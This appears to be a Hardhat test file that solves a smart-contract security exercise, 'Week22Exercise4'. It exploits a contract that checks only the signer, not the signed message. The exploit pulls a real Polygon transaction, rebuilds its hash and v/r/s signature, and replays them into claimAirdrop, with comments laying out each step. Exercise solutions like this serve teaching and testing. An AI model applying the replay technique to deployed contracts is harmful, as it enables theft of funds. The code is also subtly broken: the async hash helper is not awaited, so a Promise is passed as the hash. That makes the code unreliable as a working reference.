const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

require("dotenv").config();

describe("Week22Exercise4", function () {
  async function deployToken() {
    const [deployer] = await ethers.getSigners();

    const Week22Exercise4 = await ethers.getContractFactory("Week22Exercise4");
    const week22Exercise4 = await Week22Exercise4.deploy();
    await week22Exercise4.deployed();

    return { deployer, week22Exercise4 };
  }

  describe("Exploit", function () {
    it("Exploit worked", async function () {
      const { week22Exercise4 } = await loadFixture(deployToken);

      expect(await week22Exercise4.hacked()).to.equal(false);

      const provider = new ethers.providers.JsonRpcProvider(
        process.env.POLYGON_PROVIDER
      );
      const txHash =
        "0x09281ab72c20092dc9b414745ef2673116e36dfe069b61d2e37ecb8815b140bf";
      const tx = await provider.getTransaction(txHash);

      const hash = getTransactionDataHash(tx);

      const signatureObject = {
        v: tx.v,
        r: tx.r,
        s: tx.s,
      };
      const signature = ethers.utils.joinSignature(signatureObject);

      // The contract just checks if the hash is signed by a particular signer
      // This signer has plenty of transactions in many chains
      // The contract doesn't care about what message was signed
      // So just go to one of their transactions, fetch the raw transaction and:
      // 1. use the v, r, s to build the signature
      // 2. build the data object that was signed from the transaction and keccak256 it
      // You know have a valid signature and hash combination for the required signer
      await week22Exercise4.claimAirdrop(1, hash, signature);

      expect(await week22Exercise4.hacked()).to.equal(true);
    });
  });
});

async function getTransactionDataHash(tx) {
  const data = {
    type: 2,
    maxPriorityFeePerGas: tx.maxPriorityFeePerGas,
    maxFeePerGas: tx.maxFeePerGas,
    gasLimit: tx.gasLimit,
    to: tx.to,
    value: tx.value,
    nonce: tx.nonce,
    data: tx.data,
    chainId: tx.chainId,
  };

  const resolvedData = await ethers.utils.resolveProperties(data);
  const serializedTransaction = ethers.utils.serializeTransaction(resolvedData);
  return ethers.utils.keccak256(serializedTransaction);
}
